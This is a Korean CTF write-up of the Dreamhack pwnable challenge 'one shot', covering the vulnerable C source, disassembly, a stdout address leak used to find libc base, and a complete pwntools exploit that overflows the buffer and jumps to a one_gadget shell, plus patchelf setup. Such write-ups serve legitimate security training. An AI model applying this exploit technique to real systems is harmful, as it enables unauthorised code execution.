---
layout: post
title: Dreamhack | one shot
subtitle: Dreamhack-Pwnable one shot
categories: dreamhack.io
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201005806-820ded99-7cab-495a-9cdb-7a8390f17873.jpg" width = 550>
</p>

이 문제는 **Hook Overwrite** 로드맵에서 One-shot gadget을 활용하는 문제입니다.

## 문제 풀이

**Full RELRO**로 인해서 Now binding, 프로그램이 실행될 때 해당 프로그램에서 사용되는 함수들의 주소를 읽어와 GOT 영역에 저장하기에, GOT Overwrite가 불가능하다.


```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

```C
printf("stdout: %p\n", stdout);

printf("MSG: ");
read(0, msg, 46);
```

* 처음에 `stdout`의 메모리 주소를 출력해주는 것으로 보아 해당 값을 통해서 libc_base 주소를 찾으면 될 것으로 예상된다.

* `msg`의 크기는 16이지만 입력받는 부분을 보면 총 46의 크기를 입력받기에 BOF가 가능하다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201009026-d632c342-9f7b-4161-84de-eec9f6408e2c.jpg" width = 500>
</p>

* `stdout`라는 함수는 `_IO_2_1_stdout_`라는 이름을 가지고 있기에 libc_base를 구할 때 해당 이름으로 구해야 한다.

```C
if(check > 0) {
    exit(0);
}
```

* `check`라는 변수가 0보다 클 경우 프로그램이 종료된다. `check` 값은 0으로 초기화되어 있지만, BOF시 값이 바뀔 수도 있으니 해당 부분에 값은 0으로 처리해야한다.

```C
printf("MSG: %s\n", msg);
memset(msg, 0, sizeof(msg));
```

* 입력받은 `msg`의 값을 출력하고, 해당 변수를 '0'으로 초기화시킨다. `memset`의 함수에서 hook overwrite가 가능한지 원형을 봐야했다.

```C
void	*ft_memset(void *b, int c, size_t len)
{
	unsigned char * bb;
	size_t			i;
	
	bb = (unsigned char *)b;
	c = (unsigned char)c;
	i = 0;
	while(i < len)
	{
		bb[i] = c;
		i++;
	}
	return (void *)bb;
}
```

* `memset` 함수의 원형으로 hook을 이용하는 부분이 없기에 **hook overwrite**는 불가능하다고 생각했다.

* 또한, 이번 문제에서는 Canary가 없기에 RET까지 덮어씌울 수 있고, 입력할 수 있는 크기가 크지 않기에 `one-gadget`을 이용한다.


```armasm
0x0000000000000a91 <+80>:    lea    rax,[rbp-0x20]
0x0000000000000a95 <+84>:    mov    edx,0x2e
0x0000000000000a9a <+89>:    mov    rsi,rax
0x0000000000000a9d <+92>:    mov    edi,0x0
0x0000000000000aa2 <+97>:    call   0x830 <read@plt>
```

* `msg`의 값은 **[rbp-0x20]**에 위치

```armasm
0x0000000000000aa7 <+102>:   cmp    QWORD PTR [rbp-0x8],0x0
0x0000000000000aac <+107>:   je     0xab8 <main+119>
```

* `check`의 값을 **[rbp-0x8]**에서 체크하기에 check 변수의 위치 확인

따라서, payload는 0x20-0x8 만큼의 **Dummy**, check의 값 QWORD(8byte)의 **0**, RET에 system('/bin/sh')을 위한 **one-gadget**을 넣으면 된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201008773-71281f35-58d7-4e07-9978-265c60a5edcf.jpg" width = 350>
</p>

```python
from pwn import *

def log(a, b):
    return success(": ".join([a, hex(b)]))

context.log_level = 'debug'

p = process('./oneshot')
libc = ELF('./libc.so.6') 

og_list = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
p.recvuntil('stdout: ')
stdout = int(p.recv(14), 16)

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
og = libc_base + og_list[0]

log('put', libc_base + libc.symbols['puts'])
log('libc base',libc_base)
log('stdout', stdout)
log('one_gadget', og)

payload = b'A' * 0x18 + p64(0) + b'D' * 0x8 + p64(og)

p.sendlineafter('MSG: ', payload)
p.interactive()
```

## Patchelf

CTF를 풀다보면 문제에 libc파일과 ld파일을 제공해주는 경우가 있다. 하지만, 이번에는 libc파일만 제공받았다. 위 코드를 로컬에서 진행하게 된다면 제공받은 libc파일에 해당하는 ld가 없기에 제대로 작동하지 않는다.

또한, `p = process('./oneshot', env = {'LD_PRELOAD' : './libc.so.6'})`처럼 환경변수도 직접 변경해줘도 작동하지 않고 **segmentation fault**가 발생할 수 있다.

이렇게 libc를 패치하기 위해서는 [patchelf](https://github.com/NixOS/patchelf)를 설치해야한다. 해당 git을 clone 해와서 아래 명령어를 따라하면 된다.

```bash
git clone https://github.com/NixOS/patchelf.git
./bootstrap.sh
./configure
make
sudo make install
make check

sudo apt-get install dh-autoreconf
```

기본적인 준비는 끝났고, libc파일을 제공 받았기에 해당 파일 ld파일을 찾아야 한다.

[ld github](https://github.com/matrix1001/welpwn/tree/master/PwnContext/libs/ld.so)에서 제공받은 libc파일의 **md5sum**을 확인하여 다운로드 받으면 된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201010083-90c496f0-5571-4b9b-b58b-53f174c92d90.jpg" width = 420>
</p>

이제 로더와 libc를 patch해주면 된다.

```bash
patchelf --set-interpreter ./ld-8c0d248ea33e6ef17b759fa5d81dda9e.so.2 ./oneshot
patchelf --replace-needed libc.so.6 ./libc.so.6 ./oneshot
```

* **patchelf 전**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201010869-58d914cb-5b55-4ec2-bb44-7d92250f2002.jpg" width = 500>
</p>

* **patchelf 후**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201011037-90398179-7d11-4969-aef9-8bd5b90a0c01.jpg" width = 600>
</p>

[typemiss](https://typemiss.tistory.com/2) 해당 링크를 참고했습니다.